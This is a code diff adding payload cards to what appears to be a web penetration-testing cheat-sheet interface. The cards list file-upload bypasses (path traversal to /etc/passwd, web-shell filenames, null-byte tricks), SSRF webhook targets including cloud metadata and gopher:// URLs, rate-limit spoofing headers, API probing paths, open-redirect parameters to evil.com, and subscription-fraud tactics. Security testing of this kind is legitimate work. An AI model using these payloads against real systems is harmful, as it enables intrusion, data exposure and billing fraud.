@@ -1647,6 +1647,171 @@
               <code>Replay draft save with poisoned data</code>
             </div>
           </div>
+          <div class="bizlogic-card">
+            <h4><i class="fas fa-upload"></i> File Upload Logic</h4>
+            <div class="bizlogic-payloads">
+              <code>Filename: ../../../etc/passwd</code>
+              <code>Filename: ....//....//etc/passwd</code>
+              <code>Filename: shell.jsp</code>
+              <code>Filename: shell.jsp%00.png</code>
+              <code>Filename: shell.jpg.jsp</code>
+              <code>Filename: .htaccess</code>
+              <code>Filename: web.config</code>
+              <code>Filename: .env</code>
+              <code>Content-Type: image/png → actual: PHP</code>
+              <code>Content-Type: image/gif → actual: JSP</code>
+              <code>Content-Type: image/jpeg → actual: ASPX</code>
+              <code>File size: 0 bytes</code>
+              <code>File size: 5GB (DoS)</code>
+              <code>Double extension: shell.php.jpg</code>
+              <code>Null byte: shell.php%00.jpg</code>
+              <code>SVG with XSS payload</code>
+              <code>PNG with embedded PHP</code>
+              <code>ZIP slip: evil filenames inside zip</code>
+              <code>Filename: con (Windows reserved)</code>
+              <code>Filename: COM1 (Windows reserved)</code>
+              <code>Filename: &lt;script&gt;alert(1)&lt;/script&gt;</code>
+            </div>
+          </div>
+          <div class="bizlogic-card">
+            <h4><i class="fas fa-plug"></i> Webhook / Callback Abuse</h4>
+            <div class="bizlogic-payloads">
+              <code>Webhook URL: http://127.0.0.1</code>
+              <code>Webhook URL: http://localhost</code>
+              <code>Webhook URL: http://[::1]</code>
+              <code>Webhook URL: http://169.254.169.254</code>
+              <code>Webhook URL: http://0x7f000001</code>
+              <code>Webhook URL: http://2130706433</code>
+              <code>Callback: attacker-controlled server</code>
+              <code>Callback data: {"admin":true}</code>
+              <code>Callback response: 200 OK with exploit</code>
+              <code>Webhook secret: predict/guess</code>
+              <code>Webhook replay with modified payload</code>
+              <code>Webhook timing: delayed execution</code>
+              <code>Callback header injection</code>
+              <code>Webhook with 10MB payload (memory)</code>
+              <code>Recursive webhook call</code>
+              <code>Webhook to file:// protocol</code>
+              <code>Webhook to gopher:// protocol</code>
+              <code>Webhook to dict:// protocol</code>
+              <code>Webhook to jar:// protocol</code>
+              <code>Webhook to netdoc:// protocol</code>
+            </div>
+          </div>
+          <div class="bizlogic-card">
+            <h4><i class="fas fa-crown"></i> Subscription / Plan Abuse</h4>
+            <div class="bizlogic-payloads">
+              <code>Downgrade then request refund</code>
+              <code>Extend trial by re-registering</code>
+              <code>Cancel subscription, keep premium access</code>
+              <code>Switch plan mid-billing cycle</code>
+              <code>Apply multiple discount codes</code>
+              <code>Use student discount with fake email</code>
+              <code>Exploit grace period for free access</code>
+              <code>Stack multiple free trials</code>
+              <code>Downgrade to free, export premium data</code>
+              <code>Change region for lower price</code>
+              <code>Use VPN for region-based pricing</code>
+              <code>Request refund after using premium features</code>
+              <code>Share subscription across accounts</code>
+              <code>Exploit annual vs monthly pricing gap</code>
+              <code>Modify subscription_id in request</code>
+              <code>Set subscription_status=active</code>
+              <code>Reuse cancelled subscription ID</code>
+              <code>API call with expired subscription token</code>
+              <code>Intercept payment webhook, modify amount</code>
+              <code>Resubscribe after refund immediately</code>
+            </div>
+          </div>
+          <div class="bizlogic-card">
+            <h4><i class="fas fa-tachometer-alt"></i> Rate Limit Bypass</h4>
+            <div class="bizlogic-payloads">
+              <code>X-Forwarded-For: 1.2.3.4</code>
+              <code>X-Real-IP: 1.2.3.4</code>
+              <code>X-Originating-IP: 1.2.3.4</code>
+              <code>X-Client-IP: 1.2.3.4</code>
+              <code>X-Forwarded-Host: 1.2.3.4</code>
+              <code>X-Remote-Addr: 1.2.3.4</code>
+              <code>X-Forwarded-For: 1.1.1.1, 2.2.2.2</code>
+              <code>Use HTTP/2 instead of HTTP/1.1</code>
+              <code>Use HTTP/1.0</code>
+              <code>Change request method (POST→GET)</code>
+              <code>Add random query param ?v=1234</code>
+              <code>Add trailing slash to URL</code>
+              <code>URL encode the path</code>
+              <code>Double URL encode the path</code>
+              <code>Use different Content-Type</code>
+              <code>Use chunked Transfer-Encoding</code>
+              <code>Add whitespace in header names</code>
+              <code>Null byte in header: X-Auth\x00-Token</code>
+              <code>Use different HTTP version header</code>
+              <code>Rotate through 256 X-Forwarded-For values</code>
+              <code>DNS rebinding for IP rotation</code>
+              <code>Use IPv6 instead of IPv4</code>
+              <code>Send empty Content-Length header</code>
+              <code>Use 127.0.0.1 as X-Forwarded-For</code>
+            </div>
+          </div>
+          <div class="bizlogic-card">
+            <h4><i class="fas fa-code-branch"></i> API Versioning Bypass</h4>
+            <div class="bizlogic-payloads">
+              <code>/api/v1/admin → /api/v2/admin</code>
+              <code>/api/v1/admin → /api/v3/admin</code>
+              <code>/api/v1 → /api/internal</code>
+              <code>/api/v1 → /api/debug</code>
+              <code>/api/v1 → /api/test</code>
+              <code>/api/v1 → /api/beta</code>
+              <code>/api/v1 → /api/staging</code>
+              <code>Header: X-API-Version: 1</code>
+              <code>Header: X-API-Version: 0</code>
+              <code>Query: ?version=1</code>
+              <code>Query: ?api_version=legacy</code>
+              <code>Query: ?format=raw</code>
+              <code>Query: ?debug=true</code>
+              <code>/api/v1/users → /api/v1/Users</code>
+              <code>/api/v1/users → /api/v1/USERS</code>
+              <code>/api/v1/users → /API/V1/USERS</code>
+              <code>Accept: application/json → text/plain</code>
+              <code>Accept: */*</code>
+              <code>Content-Type: application/json → text/xml</code>
+              <code>Content-Type: application/json → multipart/form-data</code>
+              <code>/graphql → /graphiql</code>
+              <code>/api → /swagger</code>
+              <code>/api → /api-docs</code>
+              <code>/api → /openapi.json</code>
+              <code>/api → /graphql/schema</code>
+            </div>
+          </div>
+          <div class="bizlogic-card">
+            <h4><i class="fas fa-external-link-alt"></i> Open Redirect / URL Abuse</h4>
+            <div class="bizlogic-payloads">
+              <code>redirect=//evil.com</code>
+              <code>redirect=/\\evil.com</code>
+              <code>redirect=//evil%2F.com</code>
+              <code>next=//evil.com</code>
+              <code>return_to=//evil.com</code>
+              <code>url=//evil.com</code>
+              <code>target=//evil.com</code>
+              <code>dest=//evil.com</code>
+              <code>continue=//evil.com</code>
+              <code>return=//evil.com</code>
+              <code>goto=//evil.com</code>
+              <code>callback=//evil.com</code>
+              <code>redirect_uri=//evil.com</code>
+              <code>redirect_url=//evil.com</code>
+              <code>redir=//evil.com</code>
+              <code>redirect_to=//evil.com</code>
+              <code>return_url=//evil.com</code>
+              <code>link=//evil.com</code>
+              <code>to=//evil.com</code>
+              <code>out=//evil.com</code>
+              <code>view=//evil.com</code>
+              <code>path=//evil.com</code>
+              <code>file=//evil.com</code>
+              <code>dir=//evil.com</code>
+              <code>page=//evil.com</code>
+            </div>
+          </div>
         </div>
       </div>
     `);
